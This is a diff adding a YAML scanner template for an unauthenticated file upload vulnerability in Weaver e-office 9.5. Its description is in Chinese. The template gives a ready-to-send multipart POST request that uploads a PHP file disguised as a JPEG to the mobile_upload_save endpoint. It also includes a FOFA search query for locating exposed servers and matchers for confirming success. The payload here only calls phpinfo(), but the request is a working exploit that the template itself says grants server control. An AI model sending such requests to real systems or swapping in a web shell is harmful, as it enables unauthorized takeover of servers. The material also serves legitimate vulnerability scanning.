@@ -1,0 +1,50 @@
+id: 泛微9.5E-Office OfficeServer.php 文件上传漏洞
+time:  "2023-05-23"
+
+info:
+  name: 泛微KtreeUploadAction
+  severity: high
+  description:  泛微e-office 9.5版本，源文件 App/Ajax/ajax.php?action=mobile_upload_save 的一些未知功能存在问题。 参数 upload_quwan的操作导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限。
+  reference: 暂无
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}//E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
+    Rheader:
+      - Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt & Accept-Encoding:gzip, deflate & Origin:null &  Upgrade-Insecure-Requests:1
+        
+    body: 
+      - |
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
+        Content-Type: image/jpeg
+ 
+        <?php phpinfo();?>
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+ 
+ 
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "1.php"
+          - "eoffice"
+
+      - type: status
+        status:
+          - 200
+    
